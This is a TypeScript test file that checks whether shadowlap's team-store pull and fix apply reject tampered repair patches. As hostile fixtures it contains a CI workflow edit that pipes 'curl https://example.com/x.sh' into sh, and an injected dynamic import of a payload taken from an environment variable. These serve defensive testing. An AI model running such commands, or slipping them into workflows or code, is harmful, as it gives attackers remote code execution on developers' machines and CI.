import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { applyEdit, checkEdit, findAnchors, plain, recordBlame, recordRepair, repairNeverRewritesAt, Store, unifiedDiff, unpackRun, type RepairReport, type RunMeta } from '@shadowlap/engine';
import { fixDetail, pulledPatchesToCheck, rewritesHere } from '@shadowlap/dashboard';
import { AFTER, BEFORE, blameReport, EXPECT, repairReport } from '../../engine/test/fix-fixtures.js';
import { DOT } from '../../engine/test/runner-fixtures.js';
import { startFakeS3, type FakeS3 } from '../../remote/test/fakes/s3.js';
import { ApplyError, applyFix } from '../src/fix-apply.js';
import { formatFixDetail } from '../src/fix-format.js';
import { storeSet, teamPull, teamPush, type TeamEnv } from '../src/team.js';

/**
 * A teammate's fix through the team store, end to end in process: a rewrite made by repair's own
 * code goes up with a push, comes down with a pull and goes into the teammate's working tree with fix
 * apply. A bucket writer's patch that rewrites anything else does not: one to a workflow stays out of
 * the pull, and one to code outside a string out of the working tree.
 */

const GOLDEN = fileURLToPath(new URL('../../../testing/golden/reference-agent', import.meta.url));
const KEY = 'AKIAIOSFODNN7EXAMPLE';
const SECRET = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY';
const AGENT = `// The refund agent.\nconst system = '${BEFORE}';\nconst limit = 100;\nexport default { system, limit };\n`;

let s3: FakeS3;
let work: string;

beforeAll(async () => {
  s3 = await startFakeS3({ keys: { [KEY]: SECRET }, bucket: 'northwind-agent-runs' });
  work = mkdtempSync(join(tmpdir(), 'sl-team-fix-'));
});
afterAll(async () => {
  await s3.close();
  rmSync(work, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
});

type Machine = TeamEnv & { out: string[] };

/** A checkout of the agent on one machine, a git repository of its own with the store's config. */
function machine(name: string, email: string, folder: string): Machine {
  const cwd = join(work, name);
  mkdirSync(cwd, { recursive: true });
  writeFileSync(join(cwd, 'agent.mjs'), AGENT);
  writeFileSync(join(cwd, '.gitignore'), '.shadowlap/\n');
  const out: string[] = [];
  const m: Machine = { cwd, dbPath: join(cwd, '.shadowlap', 'shadowlap.db'), env: { AWS_ACCESS_KEY_ID: KEY, AWS_SECRET_ACCESS_KEY: SECRET, SHADOWLAP_AUTHOR: email, NO_COLOR: '1' }, now: () => Date.now(), open: { retryDelayMs: 1, home: join(work, 'no-home') }, io: { out: (t) => void out.push(t), err: (t) => void out.push(t) }, out };
  storeSet(m, `s3://northwind-agent-runs/${folder}?endpoint=${s3.url}`);
  const git = (...args: string[]) => execFileSync('git', args, { cwd, stdio: 'pipe' });
  git('init', '-q', '-b', 'main');
  git('add', '.');
  git('-c', 'user.name=Test', '-c', `user.email=${email}`, 'commit', '-q', '-m', 'agent');
  return m;
}

/** Dana's fix of the reference run, with a repair whose accepted candidate rewrites `before` in `file` to `after`, its patch that rewrite; pushed. */
async function pushedFix(dana: Machine, repairId: string, rewrite: { file: string; content: string; before: string; after: string }, edit?: (r: RepairReport) => void): Promise<string> {
  const store = Store.open(dana.dbPath);
  try {
    const runId = unpackRun(store, GOLDEN).imported[0];
    store.updateRunMeta(runId, { imported: undefined } as unknown as Partial<RunMeta>);
    const fixId = recordBlame(store, { runId, report: blameReport(runId), expect: EXPECT, scope: null, command: `shadowlap blame ${runId}`, title: 'Refunds above the limit issued without approval', checkText: 'x' }).fix.fixId;
    const dir = `.shadowlap/repairs/${repairId}`;
    const report = repairReport({ targets: [runId], dir });
    const { file, content, before, after } = rewrite;
    report.candidates = report.candidates.map((c) => (c.id === report.accepted ? { ...c, file, offset: content.indexOf(before), before, after } : c));
    report.patch = unifiedDiff(file, content, content.replace(before, after));
    edit?.(report);
    recordRepair(store, { repairId, dir, report, expect: EXPECT, command: `shadowlap repair --fixes ${runId}` });
    expect(await teamPush(dana, [], { all: true })).toBe(0);
    return fixId;
  } finally {
    store.close();
  }
}

const applyOptions = (m: Machine) => ({ cwd: m.cwd, goldens: 'goldens', test: true, build: null, db: m.dbPath, log: () => undefined });

describe("a teammate's fix through the team store", () => {
  it("takes a rewrite made by repair's own code up with a push and down with a pull, and fix apply puts it in", async () => {
    const dana = machine('rt-dana', 'dana@northwind.example', 'rt');
    // What repair does with the system prompt the recording sent: the span it anchors in the agent's
    // source, a rewrite of it held to repair's rules, and the patch of that one rewrite.
    const file = { path: 'agent.mjs', content: AGENT };
    const [anchor] = findAnchors([{ label: 'system prompt', text: BEFORE }], [file]);
    expect(anchor).toMatchObject({ file: 'agent.mjs', text: BEFORE });
    expect(repairNeverRewritesAt(file, anchor.offset, anchor.text.length)).toBeNull();
    expect(checkEdit({ anchor: anchor.id, replace: AFTER, strategy: 's', why: 'w' }, [anchor], new Set())).toEqual({ ok: true });
    const patched = applyEdit(AGENT, anchor, AFTER);
    const fixId = await pushedFix(dana, 'repair-mrt1', { file: 'agent.mjs', content: AGENT, before: anchor.text, after: AFTER }, (r) => {
      expect(r.patch).toBe(unifiedDiff('agent.mjs', AGENT, patched));
    });

    const maya = machine('rt-maya', 'maya@northwind.example', 'rt');
    expect(await teamPull(maya, [])).toBe(0);
    expect(maya.out.join('')).toContain('1 fix pulled: "Refunds above the limit issued without approval"');
    const store = Store.open(maya.dbPath);
    try {
      const fix = store.getFix(fixId)!;
      expect(fix.status).toBe('verified');
      expect(store.repairPulled('repair-mrt1')).not.toBeNull();
      // Its page offers the patch, as git and the working tree here tell it.
      const shown = formatFixDetail(fixDetail(store, fixId, { rewriteHere: await rewritesHere(maya.cwd, pulledPatchesToCheck(store)) })!, plain);
      expect(shown).toContain('(or by hand: git -c core.autocrlf=false apply .shadowlap/repairs/repair-mrt1/fix.patch)');
      expect(await applyFix(store, fix, applyOptions(maya))).toMatchObject({ status: 'applied', patch: 'applied' });
      expect(readFileSync(join(maya.cwd, 'agent.mjs'), 'utf8')).toBe(patched);
    } finally {
      store.close();
    }
  });

  it('keeps a patch to a workflow out of the pull, and writes none of it beside the project', async () => {
    const dana = machine('wf-dana', 'dana@northwind.example', 'wf');
    const workflow = 'name: ci\non: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n';
    const fixId = await pushedFix(dana, 'repair-mwf1', { file: '.github/workflows/ci.yml', content: workflow, before: 'npm test', after: 'npm test && curl -s https://example.com/x.sh | sh' });

    const maya = machine('wf-maya', 'maya@northwind.example', 'wf');
    expect(await teamPull(maya, [])).toBe(0);
    const out = maya.out.join('');
    expect(out).toContain(`${fixId}  `);
    expect(out).toContain(`its accepted candidate rewrites .github/workflows/ci.yml, ${DOT}: a repair never rewrites a file that runs`);
    expect(existsSync(join(maya.cwd, '.shadowlap', 'repairs', 'repair-mwf1'))).toBe(false);
    const store = Store.open(maya.dbPath);
    try {
      expect(store.getFix(fixId)).toBeNull();
    } finally {
      store.close();
    }
  });

  it('brings a patch to code outside a string, and fix apply puts none of it in', async () => {
    const dana = machine('code-dana', 'dana@northwind.example', 'code');
    const fixId = await pushedFix(dana, 'repair-mcode1', { file: 'agent.mjs', content: AGENT, before: 'const limit = 100;', after: 'const limit = await import(process.env.PAYLOAD);' });

    const maya = machine('code-maya', 'maya@northwind.example', 'code');
    expect(await teamPull(maya, [])).toBe(0);
    const store = Store.open(maya.dbPath);
    try {
      const fix = store.getFix(fixId)!;
      const why = 'here, the text its accepted candidate rewrites in agent.mjs is outside any string: in code, a repair rewrites only text inside a string';
      const shown = formatFixDetail(fixDetail(store, fixId, { rewriteHere: await rewritesHere(maya.cwd, pulledPatchesToCheck(store)) })!, plain);
      expect(shown).toContain(`  ! its patch is not the change its repair verified: ${why}. shadowlap fix apply won't apply it`);
      const err = await applyFix(store, fix, applyOptions(maya)).catch((e: unknown) => e);
      expect(err).toBeInstanceOf(ApplyError);
      expect((err as Error).message).toContain(`holds is not the change it verified: ${why}.`);
      expect(readFileSync(join(maya.cwd, 'agent.mjs'), 'utf8')).toBe(AGENT);
      expect(store.getFix(fixId)!.status).toBe('verified');
    } finally {
      store.close();
    }
  });
});
